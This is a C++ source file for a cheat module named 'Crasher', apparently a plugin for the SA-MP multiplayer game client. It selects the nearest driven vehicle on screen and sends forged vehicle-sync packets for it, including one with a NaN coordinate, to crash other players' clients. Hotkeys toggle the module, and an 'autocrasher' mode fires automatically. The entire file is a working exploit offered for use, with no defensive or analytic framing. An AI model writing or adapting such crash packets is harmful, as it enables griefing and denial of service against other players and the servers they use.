#include "Crasher.h"

#include <game_sa/CVehicle.h>

#include <RakHook/rakhook.hpp>
#include <RakNet/PacketEnumerations.h>
#include <RakNet/PacketPriority.h>

#include <plugin.h>
#include "sampapi.h"

#include "main/PluginState.h"
#include "utils/game/GameUtils.h"
#include "utils/controls/KeyCheck.h"
#include "ktcoro_wait.hpp"
#include "SampDefines.h"

#include "utils/graphic/d3d/D3Draw.h"

[[noreturn]] ktwait ElectorLoop(Crasher* self);

Crasher::Crasher()
{
    properties.name = "Crasher";
    properties.mainLoop = reinterpret_cast<ModuleCallbackSign>(gameProcess);
    properties.direct3DPresent = reinterpret_cast<ModuleDirect3DPresentSign>(draw);

    enabled = {};
    lastCrash = std::chrono::steady_clock::now();

    tasks.push_back(taskManager.add_task(ElectorLoop, this));

    configEntry.Register(ConfigManager::GetInstance());
    config = &configEntry.Get();

    rakhook::on_send_packet += [ & ](
            RakNet::BitStream *bs, PacketPriority &priority, PacketReliability &reliability, char &ord_channel) -> bool
    {
        bs->ResetReadPointer();
        BYTE packetId;
        bs->Read(packetId);

        if (!enabled || std::chrono::duration<float, std::milli>(std::chrono::steady_clock::now() - lastCrash)
                .count() > 2000)
            return true;

        switch (packetId) {
            //case(ID_PLAYER_SYNC):
            case(ID_VEHICLE_SYNC):
                return false;
            default:
                return true;
        }
    };
}

void sendPlayerSync() {
    using namespace samp::Synchronization;

    auto localPlayer = samp::RefNetGame()->GetPlayerPool()->GetLocalPlayer();

    RakNet::BitStream bitStream;
    OnfootData onfootData;

    memcpy_s(&onfootData, sizeof(OnfootData),
             &localPlayer->m_onfootData, sizeof(OnfootData));

    bitStream.Write(static_cast<uint8_t>(ID_PLAYER_SYNC));
    bitStream.Write(reinterpret_cast<const char*>(&onfootData), sizeof(OnfootData));

    rakhook::send(&bitStream, HIGH_PRIORITY, RELIABLE_SEQUENCED, 0);
}

void sendCrashSync(sampapi::ID id, float x, float y, float z)
{
    using namespace samp::Synchronization;

    RakNet::BitStream bitStream;
    IncarData incarData;

    memset(&incarData, 0, sizeof(IncarData));

    bitStream.Write(static_cast<uint8_t>(ID_VEHICLE_SYNC));

    incarData.m_nVehicle = id;
    incarData.m_position.x = x;
    incarData.m_position.y = y;
    incarData.m_position.z = z;
    bitStream.Write(reinterpret_cast<const char*>(&incarData), sizeof(IncarData));

    rakhook::send(&bitStream, HIGH_PRIORITY, RELIABLE_SEQUENCED, 0);
}

[[noreturn]] ktwait ElectorLoop(Crasher* self)
{
    auto& selectedVehicleId = self->selectedVehicleId;

    while (true)
    {
        co_await(1);

        selectedVehicleId = std::nullopt;

        std::vector<std::pair<float, sampapi::ID>> vehicles;

        for (sampapi::ID i{}; i < SAMP_MAX_VEHICLES; ++i)
        {
            const auto pVehicle = samp::RefNetGame()->GetVehiclePool()->Get(i);
            if (!pVehicle)
                continue;

            if (!pVehicle->HasDriver())
                continue;

            if (!GameUtils::IsOnScreen(pVehicle->m_pGameVehicle->GetPosition()))
                continue;

            vehicles.emplace_back(pVehicle->GetDistanceToLocalPlayer(), i);
        }

        if (vehicles.empty())
            continue;

        const auto& [_, closestVehicleId] = *std::min_element(
                vehicles.begin(), vehicles.end(), [](const auto& left, const auto& right) {
                    return left.first < right.first;
                });

        selectedVehicleId = closestVehicleId;
    }
}

void Crasher::crash() {
    if (std::chrono::duration<float, std::milli>(std::chrono::steady_clock::now() - lastCrash)
                .count() < 2000)
        return;

    if (!selectedVehicleId.has_value())
        return;

    sampapi::ID id = selectedVehicleId.value();

    const auto& pVehicle = samp::RefNetGame()->GetVehiclePool()->Get(id);

    if (!pVehicle)
        return;

    if (pVehicle->GetDistanceToLocalPlayer() > config->radius)
        return;

    const auto& vehiclePosition = pVehicle->m_pGameVehicle->GetPosition();

    lastCrash = std::chrono::steady_clock::now();

    char message[256]{0};
    sprintf(message, "Crashing %d!", id);

    samp::RefChat()->AddChatMessage(PROJECT_NAME, D3DCOLOR_XRGB(255, 100, 100), message);

    sendCrashSync(id, vehiclePosition.x, vehiclePosition.y, vehiclePosition.z);
    sendCrashSync(id, vehiclePosition.x, vehiclePosition.y, NAN);
    sendCrashSync(id, vehiclePosition.x, vehiclePosition.y + 150, vehiclePosition.z);
    //sendPlayerSync();
}

void Crasher::gameProcess(Crasher* self)
{
    if (samp::RefInputBox()->m_bEnabled || samp::RefDialog()->m_bIsActive)
        return;

    if (KeyCheck::Check(KB_1) && KeyCheck::CheckJustDown(KB_2)) {
        self->enabled = !self->enabled;

        samp::RefChat()->AddChatMessage(PROJECT_NAME, D3DCOLOR_XRGB(255, 255, 255), "Switching crasher!");

        if (self->enabled) {
            samp::RefChat()->AddChatMessage(PROJECT_NAME, D3DCOLOR_XRGB(255, 255, 255), "Crasher enabled!");
        } else {
            samp::RefChat()->AddChatMessage(PROJECT_NAME, D3DCOLOR_XRGB(255, 255, 255), "Crasher disabled!");
        }
    }
    if (!self->enabled) { return; }

    self->taskManager.process();

    if (KeyCheck::Check(KB_1) && KeyCheck::CheckJustDown(KB_3)) {
        self->config->autocrasher = !self->config->autocrasher;

        samp::RefChat()->AddChatMessage(PROJECT_NAME, D3DCOLOR_XRGB(255, 255, 255), "Switching autocrasher!");

        if (self->config->autocrasher)
            samp::RefChat()->AddChatMessage(PROJECT_NAME, D3DCOLOR_XRGB(255, 255, 255), "Autocrasher enabled!");
        else
            samp::RefChat()->AddChatMessage(PROJECT_NAME, D3DCOLOR_XRGB(255, 255, 255), "Autocrasher disabled!");
        return;
    }

    if (self->config->autocrasher) {
        self->crash();
        return;
    }

    if (KeyCheck::CheckJustUp(KB_X))
        self->crash();
}


void Crasher::draw(Crasher* self, IDirect3DDevice9* pDevice, const RECT *pSourceRect, const RECT *pDestRect,
                  HWND hDestWindowOverride, const RGNDATA *pDirtyRegion)
{
    const auto* config = self->config;

    if (!self->enabled)
        return;

    if (!self->selectedVehicleId.has_value())
        return;

    const auto pVehicle = samp::RefNetGame()->GetVehiclePool()->Get(self->selectedVehicleId.value());
    if (!pVehicle)
        return;

    const CBoundingBox boundingBox = pVehicle->m_pGameVehicle->GetColModel()->m_boundBox;

    const auto radius = std::vector<float>{std::max(boundingBox.m_vecMin.x, boundingBox.m_vecMin.y), std::min(boundingBox.m_vecMax.x, boundingBox.m_vecMax.y)};

    const Vector3f vehiclePosition = pVehicle->m_pGameVehicle->GetPosition();

    D3Draw::Draw3DCircle(vehiclePosition, 5.f, 64, D3DCOLOR_RGBA(30, 255, 30, 200));
}